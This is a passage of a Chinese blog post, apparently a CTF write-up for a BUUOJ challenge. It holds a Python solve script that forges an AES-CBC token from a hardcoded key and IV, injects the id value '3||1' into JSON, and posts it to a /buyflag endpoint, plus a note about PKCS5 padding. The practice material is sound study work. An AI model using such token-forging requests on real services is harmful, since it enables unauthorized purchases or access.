class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2020/5/25 23:07</span></span><br><span class="line"><span class="comment"># @Author  : glotozz</span></span><br><span class="line"><span class="comment"># @File    : 2.py</span></span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_to_16</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(text.encode(<span class="string">'utf-8'</span>)) % <span class="number">16</span>:</span><br><span class="line">        add = <span class="number">16</span> - (len(text.encode(<span class="string">'utf-8'</span>)) % <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        add = <span class="number">0</span></span><br><span class="line">    text = text + (<span class="string">'\0'</span> * add)</span><br><span class="line">    <span class="keyword">return</span> text.encode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="comment"># def encrypt(text):</span></span><br><span class="line"><span class="comment">#     key = '31169fedc9a20ecf'</span></span><br><span class="line"><span class="comment">#     mode = AES.MODE_CBC</span></span><br><span class="line"><span class="comment">#     iv = b'd96adeefaa0102a9'</span></span><br><span class="line"><span class="comment">#     # text = add_to_16(text)</span></span><br><span class="line"><span class="comment">#     cryptos = AES.new(key, mode, iv)</span></span><br><span class="line"><span class="comment">#     cipher_text = cryptos.encrypt(text)</span></span><br><span class="line"><span class="comment">#     # 因为AES加密后的字符串不一定是ascii字符集的，输出保存可能存在问题，所以这里转为16进制字符串</span></span><br><span class="line"><span class="comment">#     return b2a_hex(cipher_text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AES_encrypt</span><span class="params">(secret_key, data, iv)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :param secret_key [str] : 加密秘钥</span></span><br><span class="line"><span class="string">    :param data [str] : 需要加密数据</span></span><br><span class="line"><span class="string">    :return   [str] :</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    BLOCK_SIZE = <span class="number">16</span>  <span class="comment"># Bytes</span></span><br><span class="line">    <span class="comment"># 数据进行 PKCS5Padding 的填充</span></span><br><span class="line">    pad = <span class="keyword">lambda</span> s: (s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE))</span><br><span class="line">    raw = pad(str(data))</span><br><span class="line">    <span class="comment"># 通过key值，使用ECB模式进行加密</span></span><br><span class="line">    cipher = AES.new(secret_key.encode(), AES.MODE_CBC, iv)</span><br><span class="line">    <span class="comment"># 得到加密后的字节码</span></span><br><span class="line">    encrypted_text = cipher.encrypt(bytes(raw))</span><br><span class="line">    <span class="comment"># 字节码转换成十六进制  再转成 字符串</span></span><br><span class="line">    encrypted_text_hex = str(b2a_hex(encrypted_text))</span><br><span class="line">    <span class="keyword">return</span> encrypted_text_hex</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print AES_encrypt('31169fedc9a20ecf', 'abc50408dfb68e833bd7d460d0fe8fe0', 'd96adeefaa0102a9')</span></span><br><span class="line"><span class="comment"># print encrypt('abc50408dfb68e833bd7d460d0fe8fe0')</span></span><br><span class="line">url = <span class="string">"http://b62b47c9-6723-4dd0-ba8a-6cb644b7d1a7.node3.buuoj.cn/buyflag"</span></span><br><span class="line">dtime = datetime.datetime.now()</span><br><span class="line">t = int(time.mktime(dtime.timetuple()))</span><br><span class="line">dataJSON = <span class="string">'&#123;"id":"3||1","timestamp":'</span> + str(t) + <span class="string">'000&#125;'</span></span><br><span class="line"><span class="comment"># print dataJSON</span></span><br><span class="line"><span class="comment"># test = '&#123;"id":1,"timestamp":1590421495000&#125;'</span></span><br><span class="line"><span class="comment"># print hashlib.md5(test.encode(encoding='UTF-8')).hexdigest()</span></span><br><span class="line"><span class="comment"># print encrypt('fb9905a554ea2b36d42af41eaee858fe')</span></span><br><span class="line">token = AES_encrypt(<span class="string">'31169fedc9a20ecf'</span>, hashlib.md5(dataJSON.encode(encoding=<span class="string">'UTF-8'</span>)).hexdigest(), <span class="string">'d96adeefaa0102a9'</span>)</span><br><span class="line"><span class="keyword">print</span> token</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'token'</span>: token,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/json;charset=UTF-8'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'application/json, text/plain, */*'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url, data=dataJSON, headers=headers)</span><br><span class="line"><span class="keyword">print</span> r.content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"><span class="keyword">print</span> r.headers</span><br><span class="line"></span><br><span class="line"><span class="comment">#92e3772654138af3b73f6f256a638e6b118698d9dc9a5f381d6b7ff2fe3a8c13a31ce2be4e39b0ded47f28918f7a6563</span></span><br><span class="line"><span class="comment">#92e3772654138af3b73f6f256a638e6b118698d9dc9a5f381d6b7ff2fe3a8c13</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;"id":1,"timestamp":1590421495000&#125;</span></span><br><span class="line"><span class="comment">#&#123;"id":1,"timestamp":1590426249&#125;</span></span><br></pre></td></tr></table></figure>

<p>但是最后少了一段，以为是语言问题，用js写了一半（因为js指定填充模式）发现应该是填充方式不同，测试发现题目环境使用的是<code>PKCS5Padding</code>方式，改了下脚本即可</p>
<p><img src="https://i.loli.net/2020/05/26/CsS7GcQI2pY4dTf.png" alt="Snipaste_2020-05-26_01-09-03.png"></p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>本文作者：</strong>
              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>版权声明： </strong>
               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/wp/" rel="tag"><i class="fa fa-tag"></i> wp</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
    
      <a class="next" href="/2020/05/24/tp5%E5%90%84%E7%89%88%E6%9C%ACsql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">
        <span class="next-text nav-default">tp5-sql注入分析</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

    <!-- 代码块复制功能 -->
  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
  </body>
</html>
